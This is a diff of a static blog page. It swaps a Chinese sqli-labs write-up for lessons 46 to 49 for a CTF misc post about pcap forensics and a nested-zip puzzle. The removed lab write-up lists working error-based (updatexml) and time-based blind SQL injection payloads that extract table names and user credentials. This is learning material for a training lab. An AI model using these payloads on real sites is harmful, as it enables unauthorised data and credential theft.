@@ -20,37 +20,33 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="补充知识在sql语句中，asc是指定按升序排列的，desc是按降序来排列的 select * from users order by 1 desc; select * from users order by 1 asc; lines terminated by XXX     每一行以XXX为结尾 lesson46提示输入sort ?sort&#x3D;1  ?sort&#x3D;2  发现sort 后面因该跟的是列">
+<meta name="description" content="一道目标明确的流量包取证首先用wireshark打开流量包一看是get型请求的联合查询注入，搜索http来过滤信息  然后就打开ok后缀的请求包（肯定是从后往前找） 率先找到后半段flag   往前找还有前半段   千万别急，有坑啊，发现前半段和后半段都有重复的地方，所以组合起来是：flag{698b0a3e29c5b0861a2d85fb14c2e2e9} 之前在buu上刷过一题更难的一题，有点">
 <meta property="og:type" content="article">
-<meta property="og:title" content="lesson46_49">
-<meta property="og:url" content="http://example.com/2022/02/04/lesson46/index.html">
+<meta property="og:title" content="misc考核">
+<meta property="og:url" content="http://example.com/2022/02/26/misc%E8%80%83%E6%A0%B8/index.html">
 <meta property="og:site_name" content="wds">
-<meta property="og:description" content="补充知识在sql语句中，asc是指定按升序排列的，desc是按降序来排列的 select * from users order by 1 desc; select * from users order by 1 asc; lines terminated by XXX     每一行以XXX为结尾 lesson46提示输入sort ?sort&#x3D;1  ?sort&#x3D;2  发现sort 后面因该跟的是列">
+<meta property="og:description" content="一道目标明确的流量包取证首先用wireshark打开流量包一看是get型请求的联合查询注入，搜索http来过滤信息  然后就打开ok后缀的请求包（肯定是从后往前找） 率先找到后半段flag   往前找还有前半段   千万别急，有坑啊，发现前半段和后半段都有重复的地方，所以组合起来是：flag{698b0a3e29c5b0861a2d85fb14c2e2e9} 之前在buu上刷过一题更难的一题，有点">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://s2.loli.net/2022/02/16/sn9aZ3S5cfvIrH1.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/16/qwOZI6SJFV1dBiX.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/16/OuF34ZWhzHXPQUE.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/16/UCebynZDLrsxGMO.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/16/dCjRKtSGMlIcrhi.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/16/jypbm2rFS5c8aU3.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/16/MWC9BIljGZgcXpL.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/16/g7LEVFOJdcShx28.png">
-<meta property="article:published_time" content="2022-02-04T08:02:32.000Z">
-<meta property="article:modified_time" content="2022-02-18T12:25:26.223Z">
+<meta property="og:image" content="https://s2.loli.net/2022/02/26/xmu52Gs7EHyw9p6.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/26/P1FfvW9am3DUoB5.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/26/v3CpGuLYkd7R84N.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/26/NMQc483tLwuKTB5.png">
+<meta property="article:published_time" content="2022-02-26T07:56:43.000Z">
+<meta property="article:modified_time" content="2022-02-26T08:23:37.422Z">
 <meta property="article:author" content="发福的小菜狗">
-<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="兼职miscer">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2022/02/16/sn9aZ3S5cfvIrH1.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/02/26/xmu52Gs7EHyw9p6.png">
 
 
-<link rel="canonical" href="http://example.com/2022/02/04/lesson46/">
+<link rel="canonical" href="http://example.com/2022/02/26/misc%E8%80%83%E6%A0%B8/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/02/04/lesson46/","path":"2022/02/04/lesson46/","title":"lesson46_49"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/02/26/misc%E8%80%83%E6%A0%B8/","path":"2022/02/26/misc考核/","title":"misc考核"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>lesson46_49 | wds</title>
+<title>misc考核 | wds</title>
   
 
 
@@ -129,7 +125,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">补充知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson46"><span class="nav-number">2.</span> <span class="nav-text">lesson46</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson47"><span class="nav-number">3.</span> <span class="nav-text">lesson47</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson48"><span class="nav-number">4.</span> <span class="nav-text">lesson48</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson49"><span class="nav-number">5.</span> <span class="nav-text">lesson49</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E7%9B%AE%E6%A0%87%E6%98%8E%E7%A1%AE%E7%9A%84%E6%B5%81%E9%87%8F%E5%8C%85%E5%8F%96%E8%AF%81"><span class="nav-number">1.</span> <span class="nav-text">一道目标明确的流量包取证</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E4%BB%A4%E4%BA%BA%E5%A4%B4%E7%9A%AE%E5%8F%91%E9%BA%BB%E7%9A%84%E7%AD%BE%E5%88%B0%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">一道令人头皮发麻的签到：</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -192,7 +188,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/04/lesson46/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/26/misc%E8%80%83%E6%A0%B8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -205,7 +201,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          lesson46_49
+          misc考核
         </h1>
 
         <div class="post-meta-container">
@@ -215,23 +211,17 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
+      
 
-      <time title="Created: 2022-02-04 16:02:32" itemprop="dateCreated datePublished" datetime="2022-02-04T16:02:32+08:00">2022-02-04</time>
+      <time title="Created: 2022-02-26 15:56:43 / Modified: 16:23:37" itemprop="dateCreated datePublished" datetime="2022-02-26T15:56:43+08:00">2022-02-26</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-18 20:25:26" itemprop="dateModified" datetime="2022-02-18T20:25:26+08:00">2022-02-18</time>
-      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
       <span class="post-meta-item-text">In</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
         </span>
     </span>
 
@@ -245,46 +235,24 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><p>在sql语句中，asc是指定按升序排列的，desc是按降序来排列的</p>
-<p>select * from users order by 1 desc;</p>
-<p>select * from users order by 1 asc;</p>
-<p>lines terminated by XXX     每一行以XXX为结尾</p>
-<h1 id="lesson46"><a href="#lesson46" class="headerlink" title="lesson46"></a>lesson46</h1><p>提示输入sort</p>
-<p>?sort=1</p>
-<p><img src="https://s2.loli.net/2022/02/16/sn9aZ3S5cfvIrH1.png" alt="QQ截图20220216163248.png"></p>
-<p>?sort=2</p>
-<p><img src="https://s2.loli.net/2022/02/16/qwOZI6SJFV1dBiX.png" alt="QQ截图20220216163356.png"></p>
-<p>发现sort 后面因该跟的是列数，1列就按1到14排序，2列就是a到z排序</p>
-<p>效果跟 order by 一样</p>
-<p>首先是用联合查询尝试，不行</p>
-<p>然后我们尝试报错注入</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(database())),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/OuF34ZWhzHXPQUE.png" alt="QQ截图20220216165840.png"></p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/UCebynZDLrsxGMO.png" alt="QQ截图20220216170022.png"></p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=0x7573657273)),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/dCjRKtSGMlIcrhi.png" alt="QQ截图20220216170202.png"></p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(concat(0x7e,username,password))from security.users)),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/jypbm2rFS5c8aU3.png" alt="QQ截图20220216170356.png"></p>
-<p>方法二用时间（延迟）注入</p>
-<p>?sort=1 and if(left(database(),1)=’s’,sleep(3),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/MWC9BIljGZgcXpL.png" alt="QQ截图20220216171635.png"></p>
-<h1 id="lesson47"><a href="#lesson47" class="headerlink" title="lesson47"></a>lesson47</h1><p>lesson47与46做法一样</p>
-<p>就是数据包裹不同，lesson47是用单引号进行包裹的</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(database())),1)–+</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),1)–+</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=0x7573657273)),1)–+</p>
-<p>?sort=3 and updatexml(1,concat(0x7e,(select group_concat(concat(0x7e,username,password))from security.users)),1)–+</p>
-<h1 id="lesson48"><a href="#lesson48" class="headerlink" title="lesson48"></a>lesson48</h1><p>没有报错的回显所以不能用报错注入</p>
-<p>只能用时间(延迟)注入</p>
-<p>?sort=1 and if(left(database(),8)=’security’,sleep(2),1)–+</p>
-<p><img src="https://s2.loli.net/2022/02/16/g7LEVFOJdcShx28.png" alt="QQ截图20220216172801.png"></p>
-<h1 id="lesson49"><a href="#lesson49" class="headerlink" title="lesson49"></a>lesson49</h1><p>也没有报错回显，用时间注入</p>
-<p>?sort=1 and if(left(database(),8)=’security’,sleep(2),1)–+</p>
-<p>?sort=1 and if(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
-<p>?sort=1 and if(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
-<p>?sort=1 and if(substr((select username from security.users limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
-<p>?sort=1 and if(substr((select password from security.users limit 0,1),1,1)=’e’,1,sleep(2))–+</p>
+        <h1 id="一道目标明确的流量包取证"><a href="#一道目标明确的流量包取证" class="headerlink" title="一道目标明确的流量包取证"></a>一道目标明确的流量包取证</h1><p>首先用wireshark打开流量包一看是get型请求的联合查询注入，搜索http来过滤信息</p>
+<p><img src="https://s2.loli.net/2022/02/26/xmu52Gs7EHyw9p6.png" alt="QQ截图20220226104603.png"></p>
+<p>然后就打开ok后缀的请求包（肯定是从后往前找）</p>
+<p>率先找到后半段flag</p>
+<img src="https://s2.loli.net/2022/02/26/P1FfvW9am3DUoB5.png" alt="QQ截图20220226101554.png" style="zoom:200%;" />
+
+<p>往前找还有前半段</p>
+<img src="https://s2.loli.net/2022/02/26/v3CpGuLYkd7R84N.png" alt="QQ截图20220226103012.png" style="zoom:200%;" />
+
+<p>千万别急，有坑啊，发现前半段和后半段都有重复的地方，所以组合起来是：flag{698b0a3e29c5b0861a2d85fb14c2e2e9}</p>
+<p>之前在buu上刷过一题更难的一题，有点类似，是叫sqltest的基于get型的时间盲注的流量包取证有点小离谱</p>
+<h1 id="一道令人头皮发麻的签到："><a href="#一道令人头皮发麻的签到：" class="headerlink" title="一道令人头皮发麻的签到："></a>一道令人头皮发麻的签到：</h1><p>好！签到题，自信满满的打开，第一层解压：flag在里面哦</p>
+<p>第二层：打开看看（zip伪加密）</p>
+<p>第三层：你这么聪明看看就懂了  乱码，好！直接夹断😂</p>
+<p>原本想一个一个去试一试，试一下是啥编码的但是看到</p>
+<img src="https://s2.loli.net/2022/02/26/NMQc483tLwuKTB5.png" alt="QQ截图20220226161808.png" style="zoom;" />
+
+<p>5m在打开的一瞬间我的电脑卡了，所有的在线翻译网站都被搞爆了，就离谱😂</p>
 
     </div>
 
@@ -294,21 +262,18 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+              <a href="/tags/%E5%85%BC%E8%81%8Cmiscer/" rel="tag"># 兼职miscer</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/02/03/lesson42/" rel="prev" title="lesson42_45">
-                  <i class="fa fa-chevron-left"></i> lesson42_45
+                <a href="/2022/02/24/upload-libs(2)/" rel="prev" title="upload-libs2">
+                  <i class="fa fa-chevron-left"></i> upload-libs2
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/02/08/lesson50/" rel="next" title="lesson54_61">
-                  lesson54_61 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
